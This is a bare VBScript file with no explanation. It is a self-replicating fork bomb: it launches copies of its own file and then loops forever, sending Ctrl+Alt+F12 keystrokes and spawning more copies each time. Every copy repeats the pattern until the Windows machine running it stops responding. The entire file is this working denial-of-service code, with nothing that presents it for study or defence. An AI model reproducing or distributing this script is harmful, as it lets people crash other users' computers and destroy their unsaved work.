Set auto=CreateObject("wscript.shell")
CreateObject("WScript.Shell").Run WScript.ScriptFullName
CreateObject("WScript.Shell").Run WScript.ScriptFullName
do
 auto.SendKeys "^%{F12}" 
 auto.SendKeys "^%{F12}" 
 CreateObject("WScript.Shell").Run WScript.ScriptFullName
 CreateObject("WScript.Shell").Run WScript.ScriptFullName
 CreateObject("WScript.Shell").Run WScript.ScriptFullName
loop
